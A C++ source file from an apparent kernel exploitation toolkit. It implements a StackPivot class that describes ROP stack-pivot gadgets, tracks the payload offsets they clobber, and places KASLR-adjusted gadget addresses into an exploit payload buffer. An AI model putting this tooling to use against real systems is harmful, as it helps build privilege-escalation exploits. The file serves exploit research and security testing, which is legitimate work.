#include <optional>
#include <string>
#include <set>
#include "pivot/Pivots.hpp"
#include "pivot/StackPivot.hpp"
#include "util/error.hpp"
#include "util/str.hpp"
#include "payloads/Payload.hpp"

StackPivot::StackPivot(const OneGadgetPivot& one_gadget)
    : one_gadget_(one_gadget) {}

StackPivot::StackPivot(const PushIndirectPivot& push_gadget,
                       const PopRspPivot& pop_gadget)
    : push_gadget_(push_gadget), pop_gadget_(pop_gadget) {}

std::string StackPivot::GetDescription(bool include_clobbers) const {
  std::string result;
  if (one_gadget_) {
    result = format_str("OneGadget @ 0x%llx: set RSP to %s + 0x%llx",
                        one_gadget_->address,
                        register_names[(uint)one_gadget_->pivot_reg.reg],
                        one_gadget_->next_rip_offset);
  } else if (push_gadget_ && pop_gadget_) {
    result = format_str(
        "PushIndirect @ 0x%llx: push %s and %s [%s + 0x%llx]; PopRsp @ 0x%llx: "
        "pivots to buf + 0x%llx",
        push_gadget_->address, register_names[(uint)push_gadget_->push_reg.reg],
        push_gadget_->indirect_type == IndirectType::JMP ? "jmp" : "call",
        register_names[(uint)push_gadget_->indirect_reg.reg],
        push_gadget_->next_rip_offset, pop_gadget_->address,
        pop_gadget_->next_rip_offset);
  } else
    throw ExpKitError("Invalid Pivot.");

  if (include_clobbers) {
    std::set<int64_t> used_offsets;
    if (one_gadget_)
      for (auto offs : one_gadget_->pivot_reg.used_offsets)
        used_offsets.insert(offs);

    if (push_gadget_) {
      for (auto offs : push_gadget_->push_reg.used_offsets)
        used_offsets.insert(offs);
      for (auto offs : push_gadget_->indirect_reg.used_offsets)
        used_offsets.insert(offs);
    }

    if (!used_offsets.empty()) {
      std::string clobber_list;
      for (auto offs : used_offsets)
        clobber_list +=
            format_str("%s0x%llx", clobber_list.empty() ? "" : ", ", offs);
      result += format_str(" (clobbers %s)", clobber_list.c_str());
    }
  }

  return result;
}

uint64_t StackPivot::GetGadgetOffset() {
  return one_gadget_ ? one_gadget_->address : push_gadget_->address;
}

uint64_t StackPivot::GetDestinationOffset() const {
  return one_gadget_ ? one_gadget_->next_rip_offset
                     : pop_gadget_->next_rip_offset;
}

void StackPivot::ApplyToPayload(Payload& payload, uint64_t kaslr_base) {
  if (push_gadget_ && pop_gadget_)
    payload.Set(push_gadget_->next_rip_offset,
                kaslr_base + pop_gadget_->address);

  // Handle clobbered offsets
  if (one_gadget_)
    // Go through all the used offsets and reserve
    for (auto used_offset : one_gadget_->pivot_reg.used_offsets)
      payload.Reserve(used_offset, 8);

  if (push_gadget_) {
    // Currently our code guarantees that indirect_reg and push_reg point at the
    // same buffer
    // TODO: Check if push_reg and indirect_reg are pointing to the same buffer
    // since we might want to support them pointing at different buffers
    // eventually.
    for (auto used_offset : push_gadget_->indirect_reg.used_offsets)
      payload.Reserve(used_offset, 8);
    for (auto used_offset : push_gadget_->push_reg.used_offsets)
      payload.Reserve(used_offset, 8);
  }
}
